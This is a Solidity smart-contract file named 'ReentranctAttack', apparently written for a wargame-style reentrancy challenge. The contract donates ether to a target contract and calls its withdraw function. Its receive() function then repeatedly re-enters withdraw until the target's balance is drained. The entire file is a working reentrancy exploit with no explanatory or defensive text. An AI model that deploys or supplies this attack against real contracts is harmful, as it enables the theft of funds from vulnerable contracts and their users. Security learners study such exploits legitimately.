// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ReentranctAttack {
    event Response(uint x);
    uint256 attacker_bal;

    function attack(address payable _contract) public payable {
        attacker_bal = msg.value;
        (bool result1, ) = _contract.call.value(attacker_bal)(abi.encodeWithSignature("donate(address)", address(this)));
        if (!result1) { emit Response(1111); }
        (bool result2, ) = _contract.call(abi.encodeWithSignature("withdraw(uint256)", attacker_bal));
        if (!result2) { emit Response(2222); }
    }

    receive() external payable {
        uint256 bal = msg.sender.balance;
        if (bal > 0) {
            if (bal < attacker_bal) attacker_bal = bal;
            (bool result, ) = msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", attacker_bal));
            if (!result) { emit Response(3333); }
        } else {
            emit Response(4444);
        }
    }
}